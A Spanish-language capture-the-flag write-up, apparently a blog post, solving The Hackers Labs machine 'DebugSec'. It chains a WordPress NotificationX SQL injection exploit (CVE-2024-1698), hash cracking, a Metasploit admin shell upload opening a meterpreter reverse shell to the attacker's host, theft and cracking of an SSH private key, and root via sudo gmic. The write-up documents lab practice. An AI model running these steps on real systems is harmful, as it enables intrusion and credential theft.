@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+  <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BNTQPFSFW4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-BNTQPFSFW4');
+</script>
+
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>murrusko | DebugSec</title>
+  
+  <link rel="stylesheet" href="/assets/css/post.css" />
+  <link rel="stylesheet" href="/assets/css/syntax.css" />
+  
+  <link rel="stylesheet" href="/assets/css/common.css" />
+  <script src="/assets/js/categories.js"></script>
+  <script>
+    const currentTheme = localStorage.getItem("theme");
+    if (currentTheme) {
+      document.documentElement.setAttribute(
+        "data-theme",
+        localStorage.getItem("theme")
+      );
+    }
+  </script>
+  
+  <script defer src="/assets/js/lbox.js"></script>
+  
+</head>
+
+  <body>
+    <main>
+      <header>
+  <a class="site-title" href="/">murrusko</a>
+  <!-- dark/light mode -->
+  <span id="dark-mode-toggle" style="cursor: pointer">
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewbox="0 0 16 16" height="1.2em" width="1.2em" xmlns="http://www.w3.org/2000/svg">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 13V2a6 6 0 1 1 0 12z"></path>
+    </svg>
+  </span>
+</header>
+
+      <section class="article">
+        <div class="article-header">
+          <h2 class="article-title">DebugSec</h2>
+          <small class="date">29 Jun 2024</small>
+          <div class="categories">
+            
+            <a href="#!" class="category">thl</a>
+            
+            <a href="#!" class="category">ctf</a>
+            
+            <a href="#!" class="category">linux</a>
+            
+            <a href="#!" class="category">avanzado</a>
+            
+          </div>
+        </div>
+        <div class="content">
+<p><img src="/assets/images/debugsec/1.jpg" alt="image"></p>
+
+<p>Estamos ante una máquina Linux de nivel avanzado creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
+10.0.2.144      08:00:27:64:b7:09       <span class="o">(</span>Unknown<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.144</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.144</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.144
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+</code></pre></div></div>
+
+<p>Una vex que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-v</span> 10.0.2.144
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 14:f7:d8:c3:33:07:81:51:da:fa:bf:4c:03:51:2a:94 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 4d:2a:b5:82:f5:f0:88:3d:75:9d:f3:fe:27:30:a6:f8 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.59 <span class="o">((</span>Debian<span class="o">))</span>
+|_http-title: Did not follow redirect to http://debugsec.thl/
+|_http-server-header: Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+</code></pre></div></div>
+
+<p>Añadimos al fichero hosts el dominio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.0.2.144 debugsec.thl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<p>Vemos que hay en la web:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 http://debugsec.thl
+http://debugsec.thl <span class="o">[</span>200 OK] Apache[2.4.59], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 <span class="o">(</span>Debian<span class="o">)]</span>, IP[10.0.2.144], MetaGenerator[WordPress 6.3.4], PoweredBy[--], Script, Title[DebugSec &amp;#8211<span class="p">;</span> sssssssss], UncommonHeaders[link], WordPress[6.3.4]        
+</code></pre></div></div>
+
+<p>Como vemos tenemos un wordpress corriendo en el servidor. Ejecutamos <code class="language-plaintext highlighter-rouge">wpscan</code> para obtener información valiosa. Usamos <code class="language-plaintext highlighter-rouge">-e u,vp</code> para enumerar usuarios y plugins vulnerables:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wpscan <span class="nt">--url</span> http://debugsec.thl <span class="nt">-e</span> u,vp
+<span class="o">[</span>+] notificationx
+ | Location: http://debugsec.thl/wp-content/plugins/notificationx/
+ | Last Updated: 2024-06-13T07:29:00.000Z
+ | <span class="o">[!]</span> The version is out of <span class="nb">date</span>, the latest version is 2.8.9
+ |
+ | Found By: Urls In Homepage <span class="o">(</span>Passive Detection<span class="o">)</span>
+ | Confirmed By: Urls In 404 Page <span class="o">(</span>Passive Detection<span class="o">)</span>
+ |
+ | <span class="o">[!]</span> 1 vulnerability identified:
+ |
+ | <span class="o">[!]</span> Title: NotificationX – Best FOMO, Social Proof, WooCommerce Sales Popup &amp; Notification Bar Plugin With Elementor &lt; 2.8.3 - Unauthenticated SQL Injection
+ |     Fixed <span class="k">in</span>: 2.8.3
+ |     References:
+ |      - https://wpscan.com/vulnerability/3a66cb18-dfba-4b6b-bde0-d0efe2853326
+ |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2024-1698
+ |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/e110ea99-e2fa-4558-bcf3-942a35af0b91
+ |
+ | Version: 2.8.2 <span class="o">(</span>100% confidence<span class="o">)</span>
+
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Vemos que hay una vulnerabilidad en el plugin <code class="language-plaintext highlighter-rouge">NotificationX</code> y tiene asignado un cve <strong>CVE-2024-1698.</strong> Buscamos información sobre la vulnerabilidad y encontramos un exploit escrito en python, lo descargamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/kamranhasan/CVE-2024-1698-Exploit/main/exploit.py
+</code></pre></div></div>
+
+<p>Modificamos la url para que sea nuestro servidor victima y modificamos el delay para que sea 1 segundo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>delay <span class="o">=</span> 1
+
+url <span class="o">=</span> <span class="s2">"http://debugsec.thl/wp-json/notificationx/v1/analytics"</span>
+
+</code></pre></div></div>
+
+<p>Al terminar nos da que el usuario administrador es <strong>wordpress</strong> y su hash. Lo añadiremos a un fichero llamado hash para después intentar crackearlo con la herramienta <code class="language-plaintext highlighter-rouge">hashcat</code>. Usamos <code class="language-plaintext highlighter-rouge">-a 0</code> para que sea un ataque usando un diccionario y <code class="language-plaintext highlighter-rouge">-m 400</code> porque se trata de un hash en formato <strong>Wordpress(MD5)</strong> . Le indicamos el hash a romper y el diccionario.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'$P$BeoVY5FZYWg4j90BEh5Cme9j3Zamqx/'</span> <span class="o">&gt;</span> <span class="nb">hash
+
+</span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 400 <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt
+
+<span class="nv">$P$BeoVY5FZYWg4j90BEh5Cme9j3Zamqx</span>/:mcartney
+</code></pre></div></div>
+
+<p>Obtenemos las credenciales de administrador del sitio. Ahora tenemos que conseguir una shell reversa. Para ello he usado un exploit de  <code class="language-plaintext highlighter-rouge">metasploit</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfconsole
+
+msf6 <span class="o">&gt;</span> use exploit/unix/webapp/wp_admin_shell_upload
+
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> options
+
+Module options <span class="o">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="o">)</span>:
+
+   Name       Current Settin  Required  Description
+              g
+   <span class="nt">----</span>       <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   PASSWORD                   <span class="nb">yes       </span>The WordPress passwor
+                                        d to authenticate wit
+                                        h
+   Proxies                    no        A proxy chain of form
+                                        at <span class="nb">type</span>:host:port[,ty
+                                        pe:host:port][...]
+   RHOSTS                     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, s
+                                        ee https://docs.metas
+                                        ploit.com/docs/using-
+                                        metasploit/basics/usi
+                                        ng-metasploit.html
+   RPORT      80              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL        <span class="nb">false           </span>no        Negotiate SSL/TLS <span class="k">for
+                                         </span>outgoing connections
+   TARGETURI  /               <span class="nb">yes       </span>The base path to the
+                                        wordpress application
+   USERNAME                   <span class="nb">yes       </span>The WordPress usernam
+                                        e to authenticate wit
+                                        h
+   VHOST                      no        HTTP server virtual h
+                                        ost
+
+Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
+                                     nterface may be specifie
+                                     d<span class="o">)</span>
+   LPORT  4444             <span class="nb">yes       </span>The listen port
+
+Exploit target:
+
+   Id  Name
+   <span class="nt">--</span>  <span class="nt">----</span>
+   0   WordPress
+
+View the full module info with the info, or info <span class="nt">-d</span> command.
+
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost eth1
+lhost <span class="o">=&gt;</span> 10.0.2.5
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost http://debugsec.thl
+rhost <span class="o">=&gt;</span> http://debugsec.thl
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>user
+<span class="nb">set </span>useragent  <span class="nb">set </span>username   
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username wordpress
+username <span class="o">=&gt;</span> wordpress
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password mcartney
+password <span class="o">=&gt;</span> mcartney
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> check
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 10.0.2.144:80 - The target appears to be vulnerable.
+msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.0.2.5:4444 
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using wordpress:mcartney...
+<span class="o">[</span>+] Authenticated with WordPress
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wp-content/plugins/mrSdippeTD/xbUJBJxMvl.php...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>39927 bytes<span class="o">)</span> to 10.0.2.144
+<span class="o">[</span>+] Deleted xbUJBJxMvl.php
+<span class="o">[</span>+] Deleted mrSdippeTD.php
+<span class="o">[</span>+] Deleted ../mrSdippeTD
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.0.2.5:4444 -&gt; 10.0.2.144:41196<span class="o">)</span> at 2024-06-30 00:02:07 +0200
+
+meterpreter <span class="o">&gt;</span> 
+</code></pre></div></div>
+
+<p>Obtenemos una sesion de meterpreter.  Ahora buscando por el servidor encontramos una clave privada en el directorio<code class="language-plaintext highlighter-rouge">/opt</code>. Nos la descargamos a nuestro equipo y vemos que usuarios hay en el sistema leyendo el fichero <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+meterpreter <span class="o">&gt;</span> <span class="nb">cd</span> /opt
+meterpreter <span class="o">&gt;</span> <span class="nb">ls
+</span>Listing: /opt
+<span class="o">=============</span>
+
+Mode              Size  Type  Last modified            Name
+<span class="nt">----</span>              <span class="nt">----</span>  <span class="nt">----</span>  <span class="nt">-------------</span>            <span class="nt">----</span>
+100755/rwxr-xr-x  3434  fil   2024-06-28 18:52:01 +02  id_rsa
+
+meterpreter <span class="o">&gt;</span> download id_rsa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading: id_rsa -&gt; /home/murrusko/id_rsa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloaded 3.35 KiB of 3.35 KiB <span class="o">(</span>100.0%<span class="o">)</span>: id_rsa -&gt; /home/murrusko/id_rsa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : id_rsa -&gt; /home/murrusko/id_rsa 
+
+meterpreter <span class="o">&gt;</span> <span class="nb">cat</span> /etc/passwd
+debugsec:x:1001:1001::/home/debugsec:/bin/bash
+                       
+</code></pre></div></div>
+
+<p>Ya tenemos un supuesto usuario con su clave privada. Le cambiamos el permiso a la clave privada h probamos a conectarnos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">chmod </span>400 id_rsa
+<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa debugsec@10.0.2.144
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>:
+</code></pre></div></div>
+
+<p>Nos pide una clave. Intentamos romperla con john.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh2john id_rsa <span class="o">&gt;</span> ssh_hash
+<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt ssh_hash
+pangga           <span class="o">(</span>id_rsa<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Una vez obtenida la contraseña nos conectamos al sistema y obtenemos la flag de user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa debugsec@10.0.2.144
+Last login: Fri Jun 28 18:57:57 2024 from 192.168.18.19
+debugsec@debugsec:~<span class="err">$</span>
+</code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Miramos si puede ejecutar algo como usuario root con <code class="language-plaintext highlighter-rouge">sudo -l</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugsec@debugsec:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>debugsec on debugsec:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User debugsec may run the following commands on debugsec:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/gmic
+</code></pre></div></div>
+
+<p>Buscamos la ayuda de gmic y vemos que hay una opción de ejecutar comandos del sistema. Ejecutamos como sudo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>debugsec@debugsec:~<span class="nv">$ </span><span class="nb">sudo </span>gmic <span class="nb">exec </span>bash
+<span class="o">[</span>gmic]-0./ Start G<span class="s1">'MIC interpreter.
+[gmic]-0./ Execute external command '</span>bash<span class="s1">' in verbose mode.
+root@debugsec:/home/debugsec# whoami
+root
+</span></code></pre></div></div>
+
+<p>Y con esto ya tendriamos rooteada la máquina.</p>
+</div>
+      </section>
+      <footer>
+  <p>© 2024 | murrusko</p>
+</footer>
+<script src="/assets/js/mode.js" defer></script>
+
+    </main>
+    <section id="category-modal-bg"></section>
+<section id="category-modal">
+  <h1 id="category-modal-title"></h1>
+  <section id="category-modal-content"></section>
+</section>
+
+  </body>
+</html>
